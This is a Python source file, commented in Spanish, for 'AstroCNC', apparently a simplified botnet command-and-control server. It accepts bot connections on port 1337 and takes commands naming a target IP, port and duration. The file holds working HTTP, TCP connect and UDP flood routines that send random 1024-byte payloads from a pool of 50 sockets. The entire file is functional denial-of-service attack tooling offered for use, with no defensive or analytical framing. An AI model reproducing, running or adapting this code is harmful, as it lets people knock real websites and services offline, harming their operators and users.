#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
# AstroCNC - Versión Simplificada

import socket
import threading
import time
import random
import asyncio

class AstroCNC:
    def __init__(self, port):
        self.port = port
        self.socketList = []
        self.attack_in_progress = False
        self.last_attack_time = 0
        
    def start(self):
        """Inicia el servidor CNC"""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', self.port))
        s.listen(1024)
        print(f"[*] AstroCNC escuchando en el puerto {self.port}")
        
        while True:
            sock, addr = s.accept()
            self.socketList.append(sock)
            print(f"[+] Nuevo bot conectado: {addr}")
            threading.Thread(target=self.handle_bot, args=(sock,)).start()
    
    def handle_bot(self, sock):
        """Maneja la conexión con un bot"""
        try:
            while True:
                data = sock.recv(1024).decode().strip()
                if not data:
                    break
                    
                if data == "PING":
                    sock.send("PONG".encode())
                elif data.startswith("!"):
                    self.process_command(data, sock)
                    
        except Exception as e:
            print(f"[!] Error con bot: {e}")
        finally:
            if sock in self.socketList:
                self.socketList.remove(sock)
            sock.close()
    
    def process_command(self, cmd, sock):
        """Procesa los comandos de ataque"""
        parts = cmd.split()
        method = parts[0][1:].upper()
        
        if method == "STOP":
            self.attack_in_progress = False
            sock.send("[+] Ataque detenido".encode())
            return
            
        if self.attack_in_progress:
            sock.send("[!] Ya hay un ataque en progreso".encode())
            return
            
        if time.time() - self.last_attack_time < 10:
            sock.send("[!] Espera 10 segundos entre ataques".encode())
            return
            
        if method in ["HTTP", "TCP", "UDP"] and len(parts) >= 4:
            ip = parts[1]
            port = int(parts[2])
            duration = int(parts[3])
            
            if duration > 300:  # Máximo 5 minutos
                sock.send("[!] Duración máxima: 300 segundos".encode())
                return
                
            self.last_attack_time = time.time()
            self.attack_in_progress = True
            
            if method == "HTTP":
                path = parts[4] if len(parts) > 4 else "/"
                threading.Thread(target=self.http_flood, args=(ip, port, duration, path)).start()
            elif method == "TCP":
                threading.Thread(target=self.tcp_flood, args=(ip, port, duration)).start()
            elif method == "UDP":
                threading.Thread(target=self.udp_flood, args=(ip, port, duration)).start()
                
            sock.send(f"[+] Ataque {method} iniciado a {ip}:{port} por {duration}s".encode())
        else:
            sock.send("[!] Comando no válido".encode())
    
    # Métodos de ataque
    def http_flood(self, ip, port, duration, path="/"):
        """Ataque HTTP Flood"""
        end_time = time.time() + duration
        while time.time() < end_time and self.attack_in_progress:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                request = f"GET {path} HTTP/1.1\r\nHost: {ip}\r\n\r\n"
                s.send(request.encode())
                s.close()
            except:
                pass
    
    def tcp_flood(self, ip, port, duration):
        """Ataque TCP Flood"""
        end_time = time.time() + duration
        while time.time() < end_time and self.attack_in_progress:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.close()
            except:
                pass
    
    def udp_flood(self, ip, port, duration):
        """Ataque UDP Flood (optimizado)"""
        end_time = time.time() + duration
        sockets = []
        
        # Crear pool de sockets
        for _ in range(50):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sockets.append(s)
            except:
                continue
        
        while time.time() < end_time and self.attack_in_progress:
            for s in sockets:
                try:
                    payload = random._urandom(1024)
                    s.sendto(payload, (ip, port))
                except:
                    continue
        
        for s in sockets:
            try:
                s.close()
            except:
                pass

if __name__ == '__main__':
    cnc = AstroCNC(port=1337)  # Cambia el puerto si lo deseas
    cnc.start()
